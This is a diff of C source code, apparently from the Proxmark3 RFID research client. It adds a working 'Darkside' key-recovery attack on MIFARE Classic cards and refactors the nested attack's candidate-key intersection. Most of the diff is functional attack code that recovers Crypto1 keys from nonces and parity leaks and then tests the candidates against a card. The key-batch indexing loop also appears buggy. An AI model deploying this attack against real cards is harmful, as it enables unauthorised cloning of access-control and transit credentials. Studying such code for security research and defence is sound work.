@@ -33,7 +33,194 @@
 #define TRACE_ERROR		 				0xFF
 
 
-// MIFARE
+static int compare_uint64(const void *a, const void *b) {
+	// didn't work: (the result is truncated to 32 bits)
+	//return (*(int64_t*)b - *(int64_t*)a);
+
+	// better:
+	if (*(uint64_t*)b == *(uint64_t*)a) return 0;
+	else if (*(uint64_t*)b < *(uint64_t*)a) return 1;
+	else return -1;
+}
+
+
+// create the intersection (common members) of two sorted lists. Lists are terminated by -1. Result will be in list1. Number of elements is returned.
+static uint32_t intersection(uint64_t *list1, uint64_t *list2)
+{
+	if (list1 == NULL || list2 == NULL) {
+		return 0;
+	}
+	uint64_t *p1, *p2, *p3;
+	p1 = p3 = list1; 
+	p2 = list2;
+
+	while ( *p1 != -1 && *p2 != -1 ) {
+		if (compare_uint64(p1, p2) == 0) {
+			*p3++ = *p1++;
+			p2++;
+		}
+		else {
+			while (compare_uint64(p1, p2) < 0) ++p1;
+			while (compare_uint64(p1, p2) > 0) ++p2;
+		}
+	}
+	*p3 = -1;
+	return p3 - list1;
+}
+
+
+// Darkside attack (hf mf mifare)
+static uint32_t nonce2key(uint32_t uid, uint32_t nt, uint32_t nr, uint64_t par_info, uint64_t ks_info, uint64_t **keys) {
+	struct Crypto1State *states;
+	uint32_t i, pos, rr; //nr_diff;
+	uint8_t bt, ks3x[8], par[8][8];
+	uint64_t key_recovered;
+	static uint64_t *keylist;
+	rr = 0;
+
+	// Reset the last three significant bits of the reader nonce
+	nr &= 0xffffff1f;
+
+	for (pos=0; pos<8; pos++) {
+		ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
+		bt = (par_info >> (pos*8)) & 0xff;
+		for (i=0; i<8; i++)	{
+				par[7-pos][i] = (bt >> i) & 0x01;
+		}
+	}
+
+	states = lfsr_common_prefix(nr, rr, ks3x, par, (par_info == 0));
+
+	if (states == NULL) {
+		*keys = NULL;
+		return 0;
+	}
+
+	keylist = (uint64_t*)states;
+	
+	for (i = 0; keylist[i]; i++) {
+		lfsr_rollback_word(states+i, uid^nt, 0);
+		crypto1_get_lfsr(states+i, &key_recovered);
+		keylist[i] = key_recovered;
+	}
+	keylist[i] = -1;
+
+	*keys = keylist;
+	return i;
+}
+
+
+int mfDarkside(uint64_t *key)
+{
+	uint32_t uid = 0;
+	uint32_t nt = 0, nr = 0;
+	uint64_t par_list = 0, ks_list = 0;
+	uint64_t *keylist = NULL, *last_keylist = NULL;
+	uint32_t keycount = 0;
+	int16_t isOK = 0;
+
+	UsbCommand c = {CMD_READER_MIFARE, {true, 0, 0}};
+
+	// message
+	printf("-------------------------------------------------------------------------\n");
+	printf("Executing command. Expected execution time: 25sec on average\n");
+	printf("Press button on the proxmark3 device to abort both proxmark3 and client.\n");
+	printf("-------------------------------------------------------------------------\n");
+
+	
+	while (true) {
+		clearCommandBuffer();
+		SendCommand(&c);
+		
+		//flush queue
+		while (ukbhit()) {
+			int c = getchar(); (void) c;
+		}
+		
+		// wait cycle
+		while (true) {
+			printf(".");
+			fflush(stdout);
+			if (ukbhit()) {
+				return -5;
+				break;
+			}
+			
+			UsbCommand resp;
+			if (WaitForResponseTimeout(CMD_ACK, &resp, 1000)) {
+				isOK  = resp.arg[0];
+				if (isOK < 0) {
+					return isOK;
+				}
+				uid = (uint32_t)bytes_to_num(resp.d.asBytes +  0, 4);
+				nt =  (uint32_t)bytes_to_num(resp.d.asBytes +  4, 4);
+				par_list = bytes_to_num(resp.d.asBytes +  8, 8);
+				ks_list = bytes_to_num(resp.d.asBytes +  16, 8);
+				nr = bytes_to_num(resp.d.asBytes + 24, 4);
+				break;
+			}
+		}	
+
+		if (par_list == 0 && c.arg[0] == true) {
+			PrintAndLog("Parity is all zero. Most likely this card sends NACK on every failed authentication.");
+			PrintAndLog("Attack will take a few seconds longer because we need two consecutive successful runs.");
+		}
+		c.arg[0] = false;
+
+		keycount = nonce2key(uid, nt, nr, par_list, ks_list, &keylist);
+
+		if (keycount == 0) {
+			PrintAndLog("Key not found (lfsr_common_prefix list is null). Nt=%08x", nt);	
+			PrintAndLog("This is expected to happen in 25%% of all cases. Trying again with a different reader nonce...");
+			continue;
+		}
+
+		qsort(keylist, keycount, sizeof(*keylist), compare_uint64);
+		keycount = intersection(last_keylist, keylist);
+		if (keycount == 0) {
+			free(last_keylist);
+			last_keylist = keylist;
+			continue;
+		}
+
+		if (keycount > 1) {
+			PrintAndLog("Found %u possible keys. Trying to authenticate with each of them ...\n", keycount);
+		} else {
+			PrintAndLog("Found a possible key. Trying to authenticate...\n");
+		}		
+
+		*key = -1;
+		uint8_t keyBlock[USB_CMD_DATA_SIZE];
+		int max_keys = USB_CMD_DATA_SIZE/6;
+		for (int i = 0; i < keycount; i += max_keys) {
+			int size = keycount - i > max_keys ? max_keys : keycount - i;
+			for (int j = 0; j < size; j++) {
+				if (last_keylist == NULL) {
+					num_to_bytes(keylist[i*max_keys + j], 6, keyBlock);
+				} else {
+					num_to_bytes(last_keylist[i*max_keys + j], 6, keyBlock);
+				}
+			}
+			if (!mfCheckKeys(0, 0, false, size, keyBlock, key)) {
+				break;
+			}
+		}	
+		
+		if (*key != -1) {
+			free(last_keylist);
+			free(keylist);
+			break;
+		} else {
+			PrintAndLog("Authentication failed. Trying again...");
+			free(last_keylist);
+			last_keylist = keylist;
+		}
+	}
+	
+	return 0;
+}
+
+
 int mfCheckKeys (uint8_t blockNo, uint8_t keyType, bool clear_trace, uint8_t keycnt, uint8_t * keyBlock, uint64_t * key){
 
 	*key = 0;
@@ -47,16 +234,6 @@ int mfCheckKeys (uint8_t blockNo, uint8_t keyType, bool clear_trace, uint8_t key
 	if ((resp.arg[0] & 0xff) != 0x01) return 2;
 	*key = bytes_to_num(resp.d.asBytes, 6);
 	return 0;
-}
-
-int compar_int(const void * a, const void * b) {
-	// didn't work: (the result is truncated to 32 bits)
-	//return (*(uint64_t*)b - *(uint64_t*)a);
-
-	// better:
-	if (*(uint64_t*)b == *(uint64_t*)a) return 0;
-	else if (*(uint64_t*)b > *(uint64_t*)a) return 1;
-	else return -1;
 }
 
 // Compare 16 Bits out of cryptostate
@@ -100,7 +277,7 @@ void* nested_worker_thread(void *arg)
 	return statelist->head.slhead;
 }
 
-int mfnested(uint8_t blockNo, uint8_t keyType, uint8_t * key, uint8_t trgBlockNo, uint8_t trgKeyType, uint8_t * resultKey, bool calibrate) 
+int mfnested(uint8_t blockNo, uint8_t keyType, uint8_t *key, uint8_t trgBlockNo, uint8_t trgKeyType, uint8_t *resultKey, bool calibrate) 
 {
 	uint16_t i;
 	uint32_t uid;
@@ -178,8 +355,8 @@ int mfnested(uint8_t blockNo, uint8_t keyType, uint8_t * key, uint8_t trgBlockNo
 			while (Compare16Bits(p1, p2) == 1) p2++;
 		}
 	}
-	p3->even = 0; p3->odd = 0;
-	p4->even = 0; p4->odd = 0;
+	*(uint64_t*)p3 = -1;
+	*(uint64_t*)p4 = -1;
 	statelists[0].len = p3 - statelists[0].head.slhead;
 	statelists[1].len = p4 - statelists[1].head.slhead;
 	statelists[0].tail.sltail=--p3;
@@ -187,24 +364,9 @@ int mfnested(uint8_t blockNo, uint8_t keyType, uint8_t * key, uint8_t trgBlockNo
 
 	// the statelists now contain possible keys. The key we are searching for must be in the
 	// intersection of both lists. Create the intersection:
-	qsort(statelists[0].head.keyhead, statelists[0].len, sizeof(uint64_t), compar_int);
-	qsort(statelists[1].head.keyhead, statelists[1].len, sizeof(uint64_t), compar_int);
-
-	uint64_t *p5, *p6, *p7;
-	p5 = p7 = statelists[0].head.keyhead; 
-	p6 = statelists[1].head.keyhead;
-	while (p5 <= statelists[0].tail.keytail && p6 <= statelists[1].tail.keytail) {
-		if (compar_int(p5, p6) == 0) {
-			*p7++ = *p5++;
-			p6++;
-		}
-		else {
-			while (compar_int(p5, p6) == -1) p5++;
-			while (compar_int(p5, p6) == 1) p6++;
-		}
-	}
-	statelists[0].len = p7 - statelists[0].head.keyhead;
-	statelists[0].tail.keytail=--p7;
+	qsort(statelists[0].head.keyhead, statelists[0].len, sizeof(uint64_t), compare_uint64);
+	qsort(statelists[1].head.keyhead, statelists[1].len, sizeof(uint64_t), compare_uint64);
+	statelists[0].len = intersection(statelists[0].head.keyhead, statelists[1].head.keyhead);
 
 	memset(resultKey, 0, 6);
 	// The list may still contain several key candidates. Test each of them with mfCheckKeys
